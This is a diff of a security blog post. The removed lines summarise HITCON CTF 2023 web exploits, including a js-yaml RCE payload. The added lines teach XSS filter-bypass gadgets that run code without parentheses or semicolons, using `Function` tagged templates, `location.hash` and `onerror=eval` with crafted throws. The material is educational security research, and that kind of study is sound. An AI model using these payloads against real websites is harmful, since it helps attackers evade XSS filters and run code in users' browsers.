@@ -1,34 +1,224 @@
-<!-- more -->
-## HITCON CTF 2023
+To address this issue, we can first use the function constructor to create a function by passing in a string. If you're not familiar with this, you can read: [How to write console.log(1) without using letters and numbers?](https://blog.huli.tw/2020/12/01/en/write-conosle-log-1-without-alphanumeric/) or [Intigriti's 0521 XSS Challenge Solution: Limited Character Combination Code](https://blog.huli.tw/2021/06/07/en/xss-challenge-by-intigriti-writeup-may/), but I will briefly introduce it here.
 
-Recently, it seems rare to see web challenges with less than 10 solves for each problem. The last time I saw such a competition was probably DiceCTF. However, I think the difficulty is secondary. The main point is to have fun, find it interesting, and learn new things. These problems, in my opinion, clearly achieved that.
-
-First, here are the write-ups from two authors.
-
-1. [https://blog.splitline.tw/hitcon-ctf-2023-challenges-zh_tw/](https://blog.splitline.tw/hitcon-ctf-2023-challenges-zh_tw/)
-2. [https://github.com/maple3142/My-CTF-Challenges/#hitcon-ctf-2023](https://github.com/maple3142/My-CTF-Challenges/#hitcon-ctf-2023)
-
-Both authors wrote detailed write-ups. Here, I will just record some key points after reading them.
-
-### Login System (7 solves)
-
-This challenge has two servers: one in Node.js and the other in Nim. Basically, most of the functionality is implemented in the Nim server. You can log in, register, and change passwords. User data is stored in a YAML file, and the goal is to achieve RCE (Remote Code Execution).
-
-The first vulnerability is request smuggling. Node.js accepts `Transfer-Encoding: CHUNKED`, but Nim only looks at the `chunk`. This difference can be exploited for smuggling purposes.
-
-But what can be done after smuggling?
-
-The second vulnerability is related to Nim's behavior with JSON. By setting a field to a very large number, Nim treats it as a `RawNumber`. When updating, it won't include quotes. This can be used for JSON injection.
-
-The third vulnerability is that, with JSON injection, you can use the functionality of js-yaml to create an object with a JS function. Finally, by calling `toString` on this object during rendering, RCE can be achieved.
-
-It would look something like this:
+In JavaScript, you can dynamically create a function using `new Function(code)`:
 
 ``` js
-privilegeLevel: {
-  toString: !<tag:yaml.org,2002:js/function> "function (){console.log('hi')}"
-}
-access: {'profile': true, register: true, login: true}
+new Function('alert(1)')
+// anonymous() { alert(1) }
 ```
 
-Oh, by the way, there is another vulnerability related to Nim's file reading. The filename can be truncated using a null byte: `test.yaml\u0000`
+And that `new` is actually not necessary; you can remove it without any issue. Furthermore, dynamically created functions can accept parameters:
+
+``` js
+new Function('a', 'alert(a+1)')
+// anonymous(a) { alert(a+1) }
+
+new Function('a', 'b', 'alert(a+b)')
+// anonymous(a,b) { alert(a+b) }
+```
+
+The last parameter will be treated as the actual code, while the preceding ones will be treated as function parameters, and it will return the created function.
+
+Therefore, we can use this point in conjunction with the tagged templates mentioned earlier to create a function from a string:
+
+``` js
+Function`alert(1)`
+// anonymous() { alert(1) }
+```
+
+So how do we execute this created function? It's simple; just use the same method again:
+
+``` js
+// Add two backticks at the end, just like the previously mentioned alert`1` usage
+// Added an extra space to avoid Markdown parser issues, but it works the same either way
+
+Function`alert(1)` ``
+```
+
+Since `alert(1)` inside is a string, the parentheses can be directly replaced with unicode, which is also a valid string representation, resulting in:
+
+``` js
+// it's actually just alert(1)
+Function`alert\u00281\u0029` ``
+```
+
+This way, the entire payload does not use any parentheses but can still execute arbitrary code!
+
+This approach utilizes the first parameter when executing the template, which is the fixed part, but we can also use the subsequent parameters. For example:
+
+``` js
+function test(a, b){
+    console.log(a) // ['_', '']
+    console.log(b) // hello
+}
+
+test`_${'hello'}`
+```
+
+When we pass both a fixed string and parameters simultaneously, the first parameter is all the fixed parts, as mentioned earlier, while the second parameter is our dynamically passed variable `hello`.
+
+Using the method above to create a function, as previously mentioned, the last parameter will be treated as the function body:
+
+``` js
+Function`_${'hello'}`
+// anonymous(_,) { hello }
+```
+
+Thus, this `hello` is the part we can control. Since it is dynamically passed, there are many ways to play with it, which can be combined with places we can control on the website. For example, `location.hash` returns the hash from the URL like `#test`, and by adding `slice(1)`, we can remove the preceding `#`, combined it becomes:
+
+``` js
+// start from this
+Function`_${'hello'}`
+
+// then using location.hash.slice(1)
+Function`_${location.hash.slice(1)}`
+
+// replace slice(1) with ``
+Function`_${location.hash.slice`1`}`
+
+// add `` to run the function
+// remember to set the hash to #alert(1)
+Function`_${location.hash.slice`1`}` ``
+```
+
+This constructs a payload that does not require parentheses but can execute arbitrary code, placing the actual string to be executed in the hash and dynamically executing the code in the hash.
+
+### onerror Event
+
+All the previous writing has not yet gotten to the main point; the original discovery mentioned at the beginning is another more clever method.
+
+In a browser environment, by using `window.onerror`, we can receive all uncaught error events:
+
+``` js
+onerror = (err) => console.log('Err:' + err.toString())
+throw 'hello';
+// Err:Uncaught hello
+```
+
+By the way, the above code will not work if executed directly in DevTools (the reason is mentioned in the original post; errors will not be thrown to `onerror` when executed directly in the console), so please open an HTML to test.
+
+In short, the above code tells us that in Chrome, the captured error message will be `Uncaught hello`.
+
+So what if we directly replace `onerror` with `alert`?
+
+``` js
+onerror = alert;
+throw 'hello';
+```
+
+You will directly see a popup saying `Uncaught hello`. The above payload does not use any parentheses and achieves the purpose of executing a function.
+
+Further extending this, we can replace `onerror` with `eval`, treating the error message as JavaScript code to execute, but the problem is how to construct valid code after replacing it with `eval`?
+
+Since the captured error message will be: `Uncaught {payload}`, this entire sentence will be treated as code to execute, so as long as we replace the payload with: `=alert(1)`, the whole sentence becomes: `Uncaught=alert(1)`, using `Uncaught` in the error message as a variable, thus forming valid code:
+
+``` js
+onerror = eval;
+throw '=alert(1)';
+```
+
+If you still don't understand the principle, replacing `eval` with `console.log` makes it very clear:
+
+``` js
+onerror = console.log;
+throw '=alert(1)';
+// Uncaught =alert(1)
+```
+
+Next, since the string follows `throw`, we can also use encoding to replace it, using `\x28` or `\u0028` will work:
+
+``` js
+onerror = eval;
+throw '=alert\x281\u0029';
+```
+
+This constructs a payload that does not require parentheses.
+
+## Further Eliminating Semicolons
+
+Tagged template strings no longer require semicolons, so let's continue along the path of `onerror` to see how to eliminate semicolons.
+
+A simple and intuitive idea is to just use a comma (for convenience, I'll use alert below):
+
+``` js
+onerror=alert,throw 1;
+```
+
+But after running it, you'll find an error: `Uncaught SyntaxError: Unexpected token 'throw'`. This is because `throw` is not an expression but a statement, so it cannot be placed after a comma; we need another method.
+
+In JavaScript, even if you don't use `if` or other code that requires a block, you can create your own block to wrap the code:
+
+``` js
+{
+  let a = 1;
+  console.log(a)
+}
+```
+
+This is indeed used in development (though not often), and its purpose is to deliberately create a block and use the `let` or `const` keywords, allowing variables to only exist within that block.
+
+By utilizing a block, you can achieve the goal of separating code without needing semicolons:
+
+``` js
+{onerror=alert}throw 1
+```
+
+In addition to using blocks, there are other cooler methods.
+
+First, let's talk about the use of commas in JavaScript. Basically, it concatenates several expressions and returns the result of the last one, such as:
+
+``` js
+if (console.log(1), alert(1), true) {
+    console.log(true)
+} else {
+    console.log(false)
+}
+// 1
+// true
+```
+
+The expressions in `if` will sequentially execute `console.log(1)`, `alert(1)`, and finally return true, so the result of the `if` is valid, printing true.
+
+And `throw` can be followed by an expression, so you can:
+
+``` js
+throw onerror=alert,1
+```
+
+This will first execute `onerror=alert`, then execute `throw 1`, achieving the same effect as our method using `{}`. This is another way that doesn't require semicolons.
+
+The Chrome part ends here; the following is all efforts made for Firefox.
+
+In Firefox, when there is an error, the format of the error message is different:
+
+``` js
+onerror=alert;
+throw 1;
+// uncaught exception: 1
+```
+
+Under this error message, it's impossible to construct valid code, and the previous suggestion of replacing `onerror` with `eval` no longer works.
+
+So Gareth Heyes continued to dig deeper and discovered two things. The first is that if you throw an Error instead of a string, the error message won't have those annoying prefixes, leaving just `Error:`:
+
+``` js
+onerror=alert;
+throw new Error(1);
+// Error: 1
+```
+
+Since `Label:` is valid code in JavaScript, you can directly place code after it, making it easy:
+
+``` js
+onerror=eval;
+throw new Error('alert(1)');
+```
+
+However, using `Error()` introduces parentheses, and Gareth Heyes' second discovery is that in Firefox, you can throw an error-like object to achieve the same effect:
+
+``` js
+onerror=eval;
+throw {lineNumber:1,columnNumber:1,fileName:1,message:'alert\x281\x29'};
+```
+
+In summary, all of these efforts are to control the final error message produced by Firefox. As long as you can control it, you can construct valid code to pass to eval for execution.
